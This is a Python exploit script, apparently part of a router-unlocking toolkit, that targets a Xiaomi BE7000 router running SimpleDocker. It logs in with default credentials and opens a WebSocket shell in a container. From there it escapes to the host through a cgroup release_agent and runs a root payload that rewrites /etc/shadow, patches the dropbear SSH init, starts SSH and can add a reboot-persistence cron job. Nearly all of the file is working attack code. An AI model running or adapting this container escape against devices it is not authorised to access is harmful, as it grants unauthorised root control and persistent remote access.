#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# connect8.py  —  SimpleDocker cgroup release_agent escape → one-time SSH
#
# Exploit path:
#   1. SimpleDocker web UI (port 9001, default creds admin/admin)
#   2. WebSocket terminal into running container (full CAP_SYS_ADMIN)
#   3. Named cgroup hierarchy + release_agent set to payload in overlay upperdir
#   4. Trigger: child cgroup exit → kernel runs payload as uid=0 on HOST
#   5. Payload patches /etc/init.d/dropbear (removes CHANNEL check), starts SSH
#
# Persistent install is handled by install_ssh.py (already in xmir-patcher).
# This module only needs SSH open once so gateway.post_connect() can take over.
#
# Tested:  Xiaomi BE7000 RC06, firmware 1.1.38 release (hackCheck=3)
# Author:  https://github.com/h8suga
# Requires: pip install websocket-client   (requests already in xmir-patcher venv)
#

import sys
import os
import time
import re
import threading

import requests

try:
    import websocket
except ImportError:
    raise ExploitNotWorked(
        'connect8 requires websocket-client.\n'
        '       Install it with: pip install websocket-client')

import xmir_base
from gateway import *

# ── tunables ──────────────────────────────────────────────────────────────────

DOCKER_PORT  = 9001
DOCKER_USER  = 'admin'
DOCKER_PASS  = 'admin'

SSH_PASSWORD = 'root'      # root password set on the router for this session

# MD5-crypt hash for SSH_PASSWORD (pre-computed so we don't need openssl on the router).
# Recompute if you change SSH_PASSWORD:  openssl passwd -1 -salt XMiR1337 <password>
_SSH_HASHES = {
    'root': '$1$XMiR1337$fg2jZ1ANKO7MLNJwZyj440',
}

def _compute_hash(password):
    """Return md5crypt hash; falls back to pre-computed table."""
    import subprocess
    try:
        h = subprocess.check_output(
            ['openssl', 'passwd', '-1', '-salt', 'XMiR1337', password],
            timeout=5, stderr=subprocess.DEVNULL).decode().strip()
        if h.startswith('$'):
            return h
    except Exception:
        pass
    return _SSH_HASHES.get(password, _SSH_HASHES['root'])

_md5_hash = _compute_hash(SSH_PASSWORD)

CGROUP_NAME  = 'xmir8'     # arbitrary name for the named cgroup hierarchy
CGROUP_CHILD = 'trigger'

PAYLOAD_NAME = 'xmir8_payload.sh'

# --persist flag: also write /data/xmir_restore_ssh.sh for reboot survival
PERSIST = '--persist' in sys.argv

# ── gateway init ──────────────────────────────────────────────────────────────
# When imported via import_module(name, gw), inited_gw is pre-set by caller.
# When run directly (python3 connect8.py <password>), we create a fresh gateway.

try:
    gw = inited_gw   # set by import_module() in connect.py
except NameError:
    _web_pw = True
    for _arg in sys.argv[1:]:
        if not _arg.startswith('--'):
            _web_pw = _arg
            break
    # Manual init so we can set passw before SSH detection (avoids interactive prompt)
    gw = Gateway(timeout=4, detect_ssh=False)
    if gw.status < 1:
        raise ExploitNotWorked(f'connect8: Xiaomi device not found at {gw.ip_addr}')
    gw.passw = SSH_PASSWORD
    _ssh_ret = gw.detect_ssh(verbose=1, interactive=False)
    if _ssh_ret > 0:
        print(f'[connect8] SSH already open on port {_ssh_ret} — will overwrite shadow and re-verify.')
    ccode = gw.device_info.get('countrycode', '??')
    print(f'CountryCode = {ccode}')
    if _web_pw:
        if isinstance(_web_pw, str):
            gw.webpassword = _web_pw
        gw.web_login()

router_ip = gw.ip_addr


def _clean(raw):
    txt = raw.decode('utf-8', errors='replace') if isinstance(raw, bytes) else raw
    txt = re.sub(r'\x1b\[[0-9;?]*[mGKHJlhABCDEFGsu]', '', txt)
    return re.sub(r'\[6n', '', txt).replace('\r', '')


def ws_exec(ws_url, commands, wait=5.0):
    """Send commands over a SimpleDocker WebSocket terminal, return output."""
    buf = []

    def on_msg(_, msg):  # _ = ws instance, unused
        buf.append(_clean(msg))

    def on_open(ws):
        def _run():
            time.sleep(0.6)
            ws.send(b'stty cols 220\n')
            time.sleep(0.3)
            for delay, cmd in commands:
                if delay > 0:
                    time.sleep(delay)
                ws.send((cmd if isinstance(cmd, bytes) else cmd.encode()) + b'\n')
            time.sleep(wait)
            ws.close()
        threading.Thread(target=_run, daemon=True).start()

    websocket.WebSocketApp(ws_url, on_message=on_msg, on_open=on_open).run_forever()
    time.sleep(0.2)
    return ''.join(buf)


# ── stage 1: check SimpleDocker ───────────────────────────────────────────────

print('[connect8] Checking SimpleDocker on {}:{}  ...'.format(router_ip, DOCKER_PORT))

try:
    requests.get(f'http://{router_ip}:{DOCKER_PORT}/', timeout=5)
except requests.ConnectionError:
    raise ExploitNotWorked(
        f'connect8: SimpleDocker not reachable at {router_ip}:{DOCKER_PORT} — '
        'USB drive must be connected with SimpleDocker running.')
except Exception as e:
    raise ExploitNotWorked(f'connect8: SimpleDocker check failed: {e}')

# ── stage 2: login to SimpleDocker ────────────────────────────────────────────

try:
    resp = requests.post(
        f'http://{router_ip}:{DOCKER_PORT}/api/system/login',
        json={'username': DOCKER_USER, 'password': DOCKER_PASS},
        timeout=8)
    resp.raise_for_status()
    token = resp.json().get('Data')
    if not token:
        raise ValueError('empty token')
except Exception:
    raise ExploitNotWorked(
        f'connect8: SimpleDocker login failed (tried {DOCKER_USER}/{DOCKER_PASS}). '
        'If you changed the default password, edit DOCKER_USER/DOCKER_PASS at the top of connect8.py.')

auth = {'Authorization': token}
print('[connect8] SimpleDocker login OK')

# ── stage 2b: ensure Docker daemon is connected (ping + auto-restart) ─────────

def _docker_ping():
    try:
        r = requests.get(f'http://{router_ip}:{DOCKER_PORT}/api/docker/info',
                         headers=auth, timeout=5)
        return r.status_code == 200
    except Exception:
        return False

if not _docker_ping():
    print('[connect8] Docker daemon not responding — restarting SimpleDocker connection ...')
    try:
        requests.post(f'http://{router_ip}:{DOCKER_PORT}/api/system/safe',
                      headers=auth, timeout=8)
    except Exception:
        pass
    time.sleep(4)
    if not _docker_ping():
        raise ExploitNotWorked(
            'connect8: Docker daemon is not running.\n'
            '       Try toggling Docker in SimpleDocker web UI or reboot the router.')
    print('[connect8] Docker daemon OK')

# ── stage 3: find a running container ─────────────────────────────────────────

try:
    _list_resp = requests.get(
        f'http://{router_ip}:{DOCKER_PORT}/api/container',
        headers=auth, timeout=8)
    _j = _list_resp.json()
    containers = (_j.get('Data') if isinstance(_j, dict) else _j) or []
except Exception as e:
    raise ExploitNotWorked(f'connect8: cannot list containers: {e}')

cid = None
for c in containers:
    status = (c.get('Status') or c.get('status') or '').lower()
    if 'up' in status or 'running' in status:
        cid = c.get('Id') or c.get('id') or ''
        if cid:
            break

if not cid:
    if containers:
        # Try to start the first stopped container
        stopped = containers[0]
        stopped_id = stopped.get('Id') or stopped.get('id') or ''
        stopped_name = stopped.get('Names') or stopped.get('name') or stopped_id[:12]
        print(f'[connect8] No running containers — starting {stopped_name} ...')
        try:
            requests.post(
                f'http://{router_ip}:{DOCKER_PORT}/api/container/{stopped_id}/start',
                headers=auth, timeout=10)
        except Exception:
            pass
        time.sleep(2)
        # Re-fetch list
        try:
            _j2 = requests.get(f'http://{router_ip}:{DOCKER_PORT}/api/container', headers=auth, timeout=8).json()
            containers = (_j2.get('Data') if isinstance(_j2, dict) else _j2) or []
        except Exception:
            pass
        for c in containers:
            status = (c.get('Status') or c.get('status') or '').lower()
            if 'up' in status or 'running' in status:
                cid = c.get('Id') or c.get('id') or ''
                if cid:
                    break

    if not cid:
        # No containers at all — try to create one from an available image
        print('[connect8] No containers found — checking available images ...')
        try:
            _ij = requests.get(f'http://{router_ip}:{DOCKER_PORT}/api/image', headers=auth, timeout=8).json()
            images = (_ij.get('Data') if isinstance(_ij, dict) else _ij) or []
        except Exception:
            images = []
        image_name = None
        for img in images:
            tag = (img.get('RepoTags') or [''])[0] if isinstance(img.get('RepoTags'), list) else img.get('RepoTags') or ''
            if tag and tag != '<none>:<none>':
                image_name = tag
                break
        if not image_name:
            raise ExploitNotWorked(
                f'connect8: SimpleDocker has no images and no containers.\n'
                f'       Open http://{router_ip}:{DOCKER_PORT}, pull a Linux image (e.g. alpine),\n'
                f'       create and start a container, then retry.')
        print(f'[connect8] Creating container from {image_name} ...')
        try:
            resp = requests.post(
                f'http://{router_ip}:{DOCKER_PORT}/api/container/run',
                headers=auth, timeout=15,
                json={'image': image_name, 'cmd': 'sh', 'name': 'xmir8_tmp'})
            cid = (resp.json().get('Data') or {}).get('Id') or ''
        except Exception as e:
            raise ExploitNotWorked(f'connect8: failed to create container: {e}')
        time.sleep(2)
        if not cid:
            raise ExploitNotWorked(
                f'connect8: could not start a container automatically.\n'
                f'       Please start one manually at http://{router_ip}:{DOCKER_PORT} and retry.')

print(f'[connect8] Found running container: {cid[:16]}...')

# ── stage 4: open WebSocket terminal ──────────────────────────────────────────

try:
    exec_id = requests.get(
        f'http://{router_ip}:{DOCKER_PORT}/api/container/{cid}/command/exec',
        headers=auth, timeout=8).json().get('Data')
    if not exec_id:
        raise ValueError('empty exec_id')
except Exception as e:
    raise ExploitNotWorked(f'connect8: cannot open exec session on container: {e}')

ws_url = (f'ws://{router_ip}:{DOCKER_PORT}/ws/api/container/terminal/{exec_id}'
          f'?containerId={cid}&token={token}')

def _ws(cmds, wait=4.0):
    # Each call opens a fresh exec session (SimpleDocker closes the old one)
    try:
        new_exec_id = requests.get(
            f'http://{router_ip}:{DOCKER_PORT}/api/container/{cid}/command/exec',
            headers=auth, timeout=8).json().get('Data')
    except Exception:
        new_exec_id = exec_id
    url = (f'ws://{router_ip}:{DOCKER_PORT}/ws/api/container/terminal/{new_exec_id}'
           f'?containerId={cid}&token={token}')
    return ws_exec(url, cmds, wait=wait)

# ── stage 5: discover host-side paths from inside the container ───────────────

print('[connect8] Detecting overlay and volume paths ...')

mounts_out = _ws([(0, 'cat /proc/mounts'), (0.3, 'echo __MOUNTS_END__')], wait=3.0)

# overlay upperdir — this directory is visible on the HOST filesystem
m = re.search(r'upperdir=([^,\) \t\n]+)', mounts_out)
if not m:
    raise ExploitNotWorked(
        'connect8: cannot find overlay upperdir in /proc/mounts — '
        'Docker storage driver must be overlay2.')

overlay_diff = m.group(1).rstrip('/')
print(f'[connect8] Overlay upperdir: {overlay_diff}')

# HOST-side path where we write the payload (container sees it as /tmp/PAYLOAD_NAME)
payload_host = f'{overlay_diff}/tmp/{PAYLOAD_NAME}'

# Find a host-visible writable dir for reading back results.
# Prefer a Docker volume mounted at /data in the container.
log_host = None
for line in mounts_out.splitlines():
    parts = line.split()
    if len(parts) >= 3 and parts[1] == '/data' and '/_data/' in parts[0]:
        log_host = parts[0].rstrip('/') + f'/{PAYLOAD_NAME}.log'
        break

if not log_host:
    # Fallback: use the overlay diff /tmp itself (already host-accessible)
    log_host = f'{overlay_diff}/tmp/{PAYLOAD_NAME}.log'

# ── stage 6: build the payload ────────────────────────────────────────────────
#
# Runs as root in the HOST mount namespace.
# /etc   = ramfs (writable, lost on reboot)  ← we patch dropbear init here
# /data  = ubifs (writable, persistent)      ← persistence goes here if --persist

_persist_block = ''
if PERSIST:
    _persist_block = f"""
# -- optional persistence (--persist flag) --
cat > /data/xmir_restore_ssh.sh << 'PERSIST_EOF'
#!/bin/sh
export PATH=/usr/sbin:/usr/bin:/sbin:/bin
grep -q '"release"' /etc/init.d/dropbear 2>/dev/null && \\
    sed -i 's/ -o "$channel" = "release"//g' /etc/init.d/dropbear
KEYFILE=/etc/dropbear/dropbear_rsa_host_key
[ -s "$KEYFILE" ] || /usr/bin/dropbearkey -t rsa -f "$KEYFILE" 2>/dev/null
HASH=$(openssl passwd -1 -salt 'XMiR1337' '{SSH_PASSWORD}')
SHADOW_FILE=$(readlink -f /etc/shadow 2>/dev/null || echo /etc/shadow)
{{ grep -v '^root:' "$SHADOW_FILE"; printf 'root:%s:19000:0:99999:7:::' "$HASH"; }} > /tmp/_sh && mv /tmp/_sh "$SHADOW_FILE"
pgrep dropbear > /dev/null || /etc/init.d/dropbear start 2>/dev/null
PERSIST_EOF
chmod +x /data/xmir_restore_ssh.sh
grep -q 'xmir_restore_ssh' /etc/crontabs/root 2>/dev/null || \\
    echo '@reboot /data/xmir_restore_ssh.sh' >> /etc/crontabs/root
echo "persist=1" >> "$LOG"
"""

PAYLOAD = f"""#!/bin/sh
export PATH=/usr/sbin:/usr/bin:/sbin:/bin
LOG="{log_host}"
echo "START" > "$LOG"; id >> "$LOG"

# 1. nvram ssh_en=1
nvram set ssh_en=1 && nvram commit
echo "ssh_en=$(nvram get ssh_en)" >> "$LOG"

# 2. Remove CHANNEL='release' check from dropbear init
#    Line: if [ "$flg_ssh" != "1" -o "$channel" = "release" ]; then
if grep -q '"release"' /etc/init.d/dropbear 2>/dev/null; then
    sed -i 's/ -o "$channel" = "release"//g' /etc/init.d/dropbear
    echo "init_patched=1" >> "$LOG"
fi

# 3. RSA host key — generate only if missing; ignore "File exists" from dropbearkey
KEYFILE=/etc/dropbear/dropbear_rsa_host_key
mkdir -p /etc/dropbear
if [ ! -f "$KEYFILE" ]; then
    /usr/bin/dropbearkey -t rsa -f "$KEYFILE" >> "$LOG" 2>&1
fi
echo "keyfile=$([ -f $KEYFILE ] && echo ok || echo missing)" >> "$LOG"

# 4. Root password  (MD5-crypt hash pre-computed, no openssl dependency)
HASH=$(openssl passwd -1 -salt 'XMiR1337' '{SSH_PASSWORD}' 2>/dev/null)
[ -z "$HASH" ] && HASH='{_md5_hash}'
SHADOW_FILE=$(readlink -f /etc/shadow 2>/dev/null || echo /etc/shadow)
{{ grep -v '^root:' "$SHADOW_FILE"; printf 'root:%s:19000:0:99999:7:::\\n' "$HASH"; }} > /tmp/_sh && mv /tmp/_sh "$SHADOW_FILE"
grep -c '^root:.*:19000:' /etc/shadow >> "$LOG" && echo "passwd=set" >> "$LOG" || echo "passwd=FAIL" >> "$LOG"

# 5. Start SSH via procd
/etc/init.d/dropbear start >> "$LOG" 2>&1
echo "dropbear_start=$?" >> "$LOG"
sleep 2
netstat -tlnp 2>/dev/null | grep ':22 ' >> "$LOG" && echo "PORT22=OPEN" >> "$LOG" || echo "PORT22=closed" >> "$LOG"
{_persist_block}
echo "DONE" >> "$LOG"
"""

# ── stage 7: write payload into container /tmp (= overlay upperdir/tmp on host) ─

print('[connect8] Writing payload ...')

write_cmds = [(0, f"cat > /tmp/{PAYLOAD_NAME} << 'XMIR8_EOF'")]
for line in PAYLOAD.strip().splitlines():
    write_cmds.append((0, line))
write_cmds += [
    (0, 'XMIR8_EOF'),
    (0.2, f'chmod +x /tmp/{PAYLOAD_NAME}'),
    (0.2, f'test -x /tmp/{PAYLOAD_NAME} && echo WRITE_OK || echo WRITE_FAIL'),
]

out = _ws(write_cmds, wait=2.0)
if 'WRITE_OK' not in out:
    raise ExploitNotWorked(
        'connect8: failed to write payload to container /tmp — '
        'container filesystem may be read-only.')

print('[connect8] Payload written')

# ── stage 8: cgroup escape ────────────────────────────────────────────────────

print('[connect8] Triggering cgroup escape ...')

escape_cmds = [
    (0,   f'mkdir -p /tmp/{CGROUP_NAME}'),
    (0.1, f'mount -t cgroup -o none,name={CGROUP_NAME} cgroup /tmp/{CGROUP_NAME} 2>/dev/null || true'),
    (0.2, f"echo '{payload_host}' > /tmp/{CGROUP_NAME}/release_agent"),
    (0.1, f'mkdir -p /tmp/{CGROUP_NAME}/{CGROUP_CHILD}'),
    (0.1, f'echo 1 > /tmp/{CGROUP_NAME}/{CGROUP_CHILD}/notify_on_release'),
    # The sh -c subshell enters the cgroup, then exits → release_agent fires
    (0.2, f"sh -c 'echo $$ > /tmp/{CGROUP_NAME}/{CGROUP_CHILD}/cgroup.procs; sleep 0.1'"),
]

_ws(escape_cmds, wait=1.5)

print('[connect8] Waiting for payload (key generation ~3 s) ...')
time.sleep(7)

# ── stage 9: read result log ──────────────────────────────────────────────────

log_container_path = f'/tmp/{PAYLOAD_NAME}.log'
# Try reading from container /tmp first (covers fallback log_host path)
result = _ws([(0.2, f'cat {log_container_path} 2>/dev/null || cat /data/{PAYLOAD_NAME}.log 2>/dev/null || echo NO_LOG')],
             wait=2.0)

if 'NO_LOG' in result and 'START' not in result:
    # Try once more — payload might still be running
    time.sleep(4)
    result = _ws([(0.2, f'cat {log_container_path} 2>/dev/null || echo NO_LOG')], wait=2.0)

for line in result.splitlines():
    line = line.strip()
    if line and not line.startswith('/') and line not in ('$', '#'):
        print(f'  [payload] {line}')

if 'PORT22=OPEN' not in result:
    # Last check: maybe procd started dropbear but netstat shows after script finishes
    time.sleep(3)
    port_check = _ws([(0.2, "netstat -tlnp 2>/dev/null | grep ':22 ' && echo OPEN22 || echo CLOSED22")],
                     wait=2.0)
    if 'OPEN22' not in port_check:
        raise ExploitNotWorked(
            'connect8: exploit ran but SSH port 22 is still closed.\n'
            '       Check the log above for errors.')

print()
print('[connect8] SSH is open on port 22!')
print(f'[connect8] Credentials: root / {SSH_PASSWORD}')
if PERSIST:
    print('[connect8] Persistence: /data/xmir_restore_ssh.sh  (@reboot via crontab)')
print()

# ── stage 10: hand off to xmir-patcher ───────────────────────────────────────
# post_connect() will SSH in, run install_ssh.py logic, etc.

gw.post_connect(lambda cmd, **kw: None, passw=SSH_PASSWORD)
